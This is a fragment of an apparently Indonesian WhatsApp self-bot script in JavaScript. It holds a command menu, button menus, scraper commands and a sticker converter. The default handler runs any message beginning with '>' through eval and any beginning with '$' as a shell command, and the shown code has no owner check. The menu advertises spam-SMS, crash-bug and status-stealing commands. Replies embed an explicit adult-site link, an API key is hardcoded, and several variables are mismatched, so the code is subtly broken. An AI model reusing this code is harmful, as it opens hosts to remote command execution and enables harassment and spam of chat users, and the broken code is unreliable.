𝞆⃝ 📡 _${prefix}smoji2_ <emoji>
𝞆⃝ 📡 _${prefix}wasted_ 
𝞆⃝ 📡 _${prefix}triggered_
  
      ⚓⃝  𝑪𝒐𝒏𝒗𝒆𝒓𝒕⚓⃝ 
  
𝞆⃝ 📡 _${prefix}toimg_
𝞆⃝ 📡 _${prefix}tomp3_
𝞆⃝ 📡 _${prefix}tomp4_
𝞆⃝ 📡 _${prefix}slow_
𝞆⃝ 📡 _${prefix}fast_
𝞆⃝ 📡 _${prefix}reverse_
𝞆⃝ 📡 _${prefix}tourl_
𝞆⃝ 📡 _${prefix}tourl2_

        ⚓⃝  𝑮𝒓𝒐𝒖𝒑 ⚓⃝ 

𝞆⃝ 📡 _${prefix}antibule_
𝞆⃝ 📡 _${prefix}antihidetag_
𝞆⃝ 📡 _${prefix}antiviewonce_
𝞆⃝ 📡 _${prefix}group_ (open/close)
𝞆⃝ 📡 _${prefix}add_
𝞆⃝ 📡 _${prefix}kick_
𝞆⃝ 📡 _${prefix}demote_
𝞆⃝ 📡 _${prefix}promote_
𝞆⃝ 📡 _${prefix}add2_
𝞆⃝ 📡 _${prefix}kick2_
𝞆⃝ 📡 _${prefix}demote2_i
𝞆⃝ 📡 _${prefix}promote2_
𝞆⃝ 📡 _${prefix}tagall_
𝞆⃝ 📡 _${prefix}tagall2_
𝞆⃝ 📡 _${prefix}tagall3_
𝞆⃝ 📡 _${prefix}tagall4_
𝞆⃝ 📡 _${prefix}tagall5_
𝞆⃝ 📡 _${prefix}hidetag_
𝞆⃝ 📡 _${prefix}grup_ (open/close)
𝞆⃝ 📡 _${prefix}closegc_
𝞆⃝ 📡 _${prefix}opengc_
𝞆⃝ 📡 _${prefix}hidetag_
𝞆⃝ 📡 _${prefix}kontag_
𝞆⃝ 📡 _${prefix}sticktag_
𝞆⃝ 📡 _${prefix}totag_

     ⚓⃝  𝑫𝒐𝒘𝒏𝒍𝒐𝒂𝒅𝒆𝒓 ⚓⃝ 

𝞆⃝ 📡 _${prefix}ytsearch_ <query>
𝞆⃝ 📡 _${prefix}play_ <query>
𝞆⃝ 📡 _${prefix}jooxsearch_ <query>
𝞆⃝ 📡 _${prefix}video_ <query>
𝞆⃝ 📡 _${prefix}ytmp3_ <link>
𝞆⃝ 📡 _${prefix}igvideo_ <link>
𝞆⃝ 📡 _${prefix}igdl_ <link>
𝞆⃝ 📡 _${prefix}igdl2_ <link>
𝞆⃝ 📡 _${prefix}igstory_ <username>
𝞆⃝ 📡 _${prefix}igimage_ <link>
𝞆⃝ 📡 _${prefix}igaudio_ <link>
𝞆⃝ 📡 _${prefix}ig_ <link>
𝞆⃝ 📡 _${prefix}ytmp4_ <link>
𝞆⃝ 📡 _${prefix}pinterest_
𝞆⃝ 📡 _${prefix}pinterest2_
𝞆⃝ 📡 _${prefix}pinterest3_
𝞆⃝ 📡 _${prefix}pinterestdl_
𝞆⃝ 📡 _${prefix}twitter_ <link>
𝞆⃝ 📡 _${prefix}twtdl_
𝞆⃝ 📡 _${prefix}tiktok_ <link>
𝞆⃝ 📡 _${prefix}tiktokvideo_ <link>
𝞆⃝ 📡 _${prefix}tiktokaudio_ <link>
𝞆⃝ 📡 _${prefix}fb_ <link>
𝞆⃝ 📡 _${prefix}brainly_ <query>
𝞆⃝ 📡 _${prefix}image_ <query>
𝞆⃝ 📡 _${prefix}anime_ <random>

     ⚓⃝   𝑶𝒘𝒏𝒆𝒓 ⚓⃝  
𝞆⃝ 📡 _${prefix}inspect_
𝞆⃝ 📡 _${prefix}join_
𝞆⃝ 📡 _${prefix}get_
𝞆⃝ 📡 _${prefix}term_ <code>
𝞆⃝ 📡 _${prefix}upswteks_
𝞆⃝ 📡 _${prefix}upswimage_
𝞆⃝ 📡 _${prefix}upswvideo_
𝞆⃝ 📡 _${prefix}upswlokasi_
𝞆⃝ 📡 _${prefix}upswaudio_
𝞆⃝ 📡 _${prefix}upswvoice_
𝞆⃝ 📡 _${prefix}upswsticker_
𝞆⃝ 📡 _${prefix}spamsms_
𝞆⃝ 📡 _${prefix}colongsw_
𝞆⃝ 📡 _${prefix}setcmd_
𝞆⃝ 📡 _${prefix}me_
𝞆⃝ 📡 _${prefix}sendbug_
𝞆⃝ 📡 _${prefix}sendbug2_
𝞆⃝ 📡 _${prefix}buggc_
𝞆⃝ 📡 _${prefix}status_
𝞆⃝ 📡 _${prefix}self_
𝞆⃝ 📡 _${prefix}public_
𝞆⃝ 📡 _${prefix}setthumb_
𝞆⃝ 📡 _${prefix}settarget_
𝞆⃝ 📡 _${prefix}setfakeimg_
𝞆⃝ 📡 _${prefix}setreply_
𝞆⃝ 📡 _x_ < java script cod`
hexa.sendMessage(from, cecan, image, {quoted:ftroli,caption: pino1, sendEphemeral:true,contextInfo: { mentionedJid: [nomor], externalAdReply: { title: 'p', body : '𝑥  999  𝑥', mediaType: 2, thumbnail: fs.readFileSync('./lib/image/cecan.jpeg'), sourceUrl: 'https://xnxx.com/video-p94cb94/step_brother_2'}}})
break
case 'menu1':
 case 'ara':
  case 'lokasi':
 run = process.uptime()
nomor = `6288210864298@s.whatsapp.net`
sendButLoc(from, `Hi @${sender.split("@")[0]}\nMade in @${nomor.split("@")[0]}❤️`,"💡 Have a nice day dude 💡", {jpegThumbnail:cecan}, 
[{buttonId:`${prefix}call`,buttonText:{displayText: 'Menu'},type:1},
{buttonId:`${prefix}stat`,buttonText:{displayText:'Statistik'},type:1},
{buttonId:`${prefix}source`,buttonText:{displayText:'Owner'},type:1}],
{contextInfo: { mentionedJid: [nomor,sender]}})
break
case 'menu1':
 case 'pp':
 run = process.uptime()
nomor = `6288210864298@s.whatsapp.net`
sendButLoc(from, `*ཁགཁགཁགཁགཁགགཁགཁགཁགཁགཁགཁགཁགཁགཁགཁགག*\n\n                   🌏  Ǐ͜ɑ͓ͥɱͣ͢F͊Ì͓ɳͫ𝑜  🌍\n\n                  菲諾·朱利安·安加拉\n\n${ucapanWaktu}\n
✗⃝🌍 *Date* : @${sender.split("@")[0]}
     
     _${time} Wib_
     _${wita} Wita_
     _${wit} Wit_ 
  

✗⃝🎩 Contak personel
bntr

✗⃝🍂 Github Owner
github.com/Finx999

✗⃝💫Creator Bot
@${nomor.split('@')[0]}

┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈
𒍮 _*NOTE USER BOT*_

*•This Whatsapp bot is still under development*

*If you are using Whatsapp Mod* 
  *Please Enter Command Like #allmenu*

*• And I thank you for* 
  *my team who have taught me about bots*
  
*• If you find a Bug*
  *Please contact Delevor Bot Whatsapp*`,"💡 Have a nice day dude 💡\n         菲諾·朱利安·安加拉\n               𝙭ȿͥt͢aͣrͫs𠒎𠐓𠐔", {jpegThumbnail:cecan}, 
[{buttonId:`${prefix}call`,buttonText:{displayText: '👤 𝑶𝑾𝑵𝑬𝑹 👤'},type:1},
{buttonId:`${prefix}stat`,buttonText:{displayText:'⚙️ 𝑺𝑻𝑨𝑻𝑰𝑺𝑻𝑰𝑪 ⚙️'},type:1},
{buttonId:`${prefix}kontol29`,buttonText:{displayText:'🖨️ 𝑺𝑪𝑹𝑰𝑷𝑻 🖨'},type:1}],
{contextInfo: { mentionedJid: [nomor]}})
break
case 'linkgroup':
 case 'public2':
              hexa.sendMessage(from, 'Sibukk!!')
               await sleep(1000)
               txtt =`Hai Kak ${pushname}\nPilih mode di bawah ini`
               buttonsMessage900 = [{buttonId: `${prefix}self`,buttonText:{displayText: 'self'},type:1},{buttonId:`${prefix}public`,buttonText:{displayText: 'publik'},type:1}]
               buttonsMessage = { contentText: `${txtt}`, footerText: 'choose one', buttons: buttonsMessage900, headerType: 1 }
               prep = await hexa.prepareMessageFromContent(from,{buttonsMessage900},{})
               hexa.relayWAMessage(prep)
break
 
  case 'oh':
sendButLoc(from, `PUNTEN SLUR`,"💡 Have a nice day dude 💡\n         菲諾·朱利安·安加拉", {jpegThumbnail:cecan}, 
[{buttonId:`${prefix}call`,buttonText:{displayText: 'OWNER'},type:1},
{buttonId:`${prefix}public`,buttonText:{displayText:'PUBLIC'},type:1},
{buttonId:`${prefix}self`,buttonText:{displayText:'SELF'},type:1}],
{contextInfo: { mentionedJid: [nomor]}})
break

 case 'set':
   hexa.updatePresence(from, Presence.recording)
var thumbnail = fs.readFileSync('./lib/image/fino.jpeg')
		var media = await hexa.prepareMessage(from, thumbnail, MessageType.image)
media.message = (Object.keys(media.message)[0] === 'ephemeralMessage') ? media.message.ephemeralMessage.message : media.message
	var IniButtoF = [
		{buttonId: `${prefix}public`, buttonText: {displayText: 'PUBLIC'}, type: 1},
		{buttonId: `${prefix}self`, buttonText: {displayText: 'SELF'}, type: 1},
		]
		var buttonMessageF = {
		contentText: `PUBLIC OR SELF`,
footerText: `chose one !!!`,
		buttons: IniButtoF,
		headerType: 4,
		imageMessage: media.message.imageMessage
		}
		await hexa.sendMessage(from, buttonMessageF, MessageType.buttonsMessage, {sendEphemeral:true, quoted: fvideo, jpegThumbnail: fs.readFileSync('./lib/image/cecan.jpeg'),contextInfo: {"forwardingScore":99999, "isForwarded":true}})
				break
				case 'bcbutton':
 let p = hexa.chats.all()
for (let _ of p)
sendButLoc(_.jid, 'Punten', `𝗕𝗥𝗢𝗔𝗗𝗖𝗔𝗦𝗧`, thumb, [
          {
            buttonId: `${prefix}call`,
            buttonText: {
              displayText: `Owner`,
            },
            type: 1,
          },
          {
            buttonId: `${prefix}menu`,
            buttonText: {
              displayText: `Menu`,
            },
            type: 1,
          },
        ]);
        break
        case 'igtools':
         let lerKon = `  ⚓⃝  𝑰𝒏𝒔𝒕𝒂𝒈𝒓𝒂𝒎 𝑻𝒐𝒐𝒍𝒔⚓⃝

𝞆⃝ 📡 _${prefix}igfollow_
𝞆⃝ 📡 _${prefix}igunfollow_
𝞆⃝ 📡 _${prefix}iglike_
𝞆⃝ 📡 _${prefix}iglike_
𝞆⃝ 📡 _${prefix}igcomment_
𝞆⃝ 📡 _${prefix}igimage_
𝞆⃝ 📡 _${prefix}upinstastory_
𝞆⃝ 📡 _${prefix}upfeed_
𝞆⃝ 📡 _${prefix}block_
𝞆⃝ 📡 _${prefix}unblock_
𝞆⃝ 📡 _${prefix}igsavepost_
𝞆⃝ 📡 _${prefix}igunsvpost`
  hexa.sendMessage(from, lerKon, text, {quoted:ftroli, sendEphemeral: true, contextInfo: { externalAdReply: { title: 'p', body : '𝑥  999  𝑥', mediaType: 2, thumbnail: fs.readFileSync('./lib/image/cecan.jpeg'), sourceUrl: 'https://xnxx.com/video-p94cb94/step_brother_2'}}})
  break
case 'sider':
infom = await hexa.messageInfo(from, m.quoted)
hemm = infom.reads
readdin = hemm.map(v => v.jid)

stamp = hemm.map(v => v.t)
function toTime(UNIX_timestamp, ribuan){
ribuan = (typeof ribuan == 'undefined') ? false : true;

let a = new Date(UNIX_timestamp);
if (ribuan) {
a = new Date(UNIX_timestamp * 1000);
}
 
//buat index bulan
var months = ['Januari','Februari','Maret','April','Mei','Juni','Juli','Agustus','September','Oktober','Nopember','Desember'];

 // ambil pecahan waktu masing-masing
var hour = a.getHours();
var min = a.getMinutes();
var sec = a.getSeconds();

// gabungkan ke dalam variable time
var time = hour + ':' + min + ':' + sec ;
return time;
}
teksx = `Wayoloh, ngeread mulu :\n`
hiks = 0
for (let i of hemm) {
hiks += 1
 teksx += `~> @${i.jid.split('@')[0]} > ${toTime(i.t, true)}\n`
 }
hexa.sendMessage(from, teksx, text, { quoted: ftroli, contextInfo: { mentionedJid: readdin }})
break  
   // ---------- < Scrape And No Api > ------------\\
 case 'alkitab':
let axios = require('axios')
let cheerio = require('cheerio')
  if (!q) return reply(`Apa yang mau di cari? contoh ${prefix} + ${command}abraham`)
    let res1 = await axios.get(`https://alkitab.me/search?q=${encodeURIComponent(q)}`, { headers: { "User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/55.0.2883.87 Safari/537.36" } })

    let $ = cheerio.load(res1.data)
    let result = []
    $('div.vw').each(function (a, b) {
        let teks = $(b).find('p').text().trim()
        let link = $(b).find('a').attr('href')
        let title = $(b).find('a').text().trim()
        result.push({ teks, link, title })
    })

    let caption = result.map(v => `${v.title}\n${v.teks}`).join('\n────────────────\n')
    reply(caption)
    break
    case 'alquran':
let fetch = require('node-fetch')

    if (!(args[0] || args[1])) return reply(`*Contoh* :\n${prefix + command} 1 2\n\nmaka hasilnya adalah surah Al-Fatihah ayat 2 beserta audionya`)
    if (isNaN(args[0]) || isNaN(args[1])) return reply(`*Contoh* :\n${prefix + command} 1 2\n\nmaka hasilnya adalah surah Al-Fatihah ayat 2 beserta audionya`)

    let res3 = await fetch(global.API('https://islamic-api-indonesia.herokuapp.com', '/api/data/quran', { surah: args[0], ayat: args[1] }))
    if (!res.ok) return await res.text()
    let json = await res3.json()
    let mes = `
${json.result.data.text.arab}
    
${json.result.data.translation.id}
( Q.S ${json.result.data.surah.name.transliteration.id} : ${json.result.data.number.inSurah} )
`.trim()
    reply(mes)
    hexa.sendFileFromUrl(from, json.result.data.audio.primary, 'tts.opus', null, mek, true)
    break
    case 'covidinfo':
let axios1 = require('axios')
let cheerio1 = require('cheerio')
 if(!q) return reply(`Ulangi dengan menambahkan nama negara\n*Contoh* : ${prefix + command} Indonesia`)
  try {
 const link3 = await axios1.get(`https://www.worldometers.info/coronavirus/country/${q}/`)
	const $ = cheerio.load(link.data)
	let kasus = $('#maincounter-wrap').find(' div > span').eq(0).text().trim()
	let mati = $('#maincounter-wrap').find(' div > span').eq(1).text().trim()
	let sembuh = $('#maincounter-wrap').find(' div > span').eq(2).text().trim()
	
	reply(`▢ *Data Covid19*

‣ *Negara* : ${text}
‣ *Jumlah kasus* : ${kasus}
‣ *Sembuh* : ${sembuh}
‣ *Meninggal* : ${mati}

Stay safe dan jalankan protokol kesehatan ya :)`)
} catch (e) {
  reply('Hasil tidak di temukan')
}
break
 case 'smoji3':
  text = args.join(" ")
try {
	const emojii = encodeURI(text)
	const link4 = await axios.get(`https://emojipedia.org/${emojii}/`)
	const $ = cheerio.load(link4.data)
var whatsapp = $('body > div.container > div.content').find('article > section.vendor-list > ul > li:nth-child(5) > div.vendor-container.vendor-rollout-target > div.vendor-image > img').attr('src');
sendStickerFromUrl(from, whatsapp)
} catch (e) {
reply('Gagal')
}
break
case 'restart':
reply(`Restart...`)
exec('npm start', (err) => {
if (err) return reply(err)
})
break
    case 'pdfsize':
      no = args.join(' ') 
   let   titleP = no.split(`|`)[0]
     let   hal = no.split('|')[1]
   let   size = no.split('|')[2]
let sizeP = await hexa.prepareMessageFromContent(from, {			"documentMessage": {
						"url": m.quoted.url,
						"mimetype": m.quoted.mimetype,
      "fileSha256": m.quoted.fileSha256.toString('base64'),
      "fileEncSha256": m.quoted.fileEncSha256.toString('base64'),
      "mediaKey": m.quoted.mediaKey.toString('base64'),
						"title": titleP,
						"fileLength": size,
						"pageCount": hal,
						"directPath": m.quoted.directPath,
			   	"mediaKeyTimestamp": m.quoted.mediaKeyTimestamp.low,
						"jpegThumbnail": cecan
					}
  }, {quoted:mek, caption: 'kerjain tugas nya kntol'})
  hexa.relayWAMessage(size)
  break
//--- trigger stiker
					case 'triggered':
					case 'trigger':
					case 'ger':
					var imgbb = require('imgbb-uploader')
					if ((isMedia && !mek.message.videoMessage || isQuotedImage) && args.length == 0) {
					ger = isQuotedImage ? JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo : mek 
					reply(mess.wait)
					owgi = await  hexa.downloadAndSaveMediaMessage(ger)
					anu = await imgbb("3b8594f4cb11895f4084291bc655e510", owgi)
					teks = `${anu.display_url}`
					ranp = getRandom('.gif')
					rano = getRandom('.webp')
					anu1 = `https://some-random-api.ml/canvas/triggered?avatar=${teks}`
					exec(`wget ${anu1} -O ${ranp} && ffmpeg -i ${ranp} -vcodec libwebp -filter:v fps=fps=20 -lossless 1 -loop 0 -preset default -an -vsync 0 -s 512:512 ${rano}`, (err) => {
					fs.unlinkSync(ranp)
					if (err) return reply(mess.error.stick)
					exec(`webpmux -set exif ${addMetadata('hexa', pushname)} ${rano} -o ${rano}`, async (error) => {
					if (error) return reply(mess.error.stick)
					hexa.sendMessage(from, fs.readFileSync(rano), sticker, {quoted: mek})
					fs.unlinkSync(rano)
					})
					})
					} else {
					reply('Gunakan foto!')
					}
					break
 //*=End-Script=*\\



default:
if (budy.startsWith('>')){
try {
return hexa.sendMessage(from, JSON.stringify(eval(budy.slice(2)),null,'\t'),text, {quoted:ftroli})
} catch(err) {
e = String(err)
reply(e)
}
}  
}


if (budy.startsWith('$')){
 reply('Executing.....')
			if (!q) return fakegroup(mess.wrongFormat)
			exec(q, (err, stdout) => {
			if (err) return fakegroup(`SELF-BOT:~ ${err}`)
			if (stdout) {
			fakegroup(stdout)
			}
   })
			}
if (isGroup && budy != undefined) {
	} else {
	console.log(color('[TEXT]', 'yellow'), 'SELF-MODE', color(sender.split("@")[0]))
	}		
	} catch (e) {
    e = String(e)
    if (!e.includes("this.isZero")) {
	console.log('Message : %s', color(e, 'green'))
        }
	// console.log(e)
	}
}


	
    
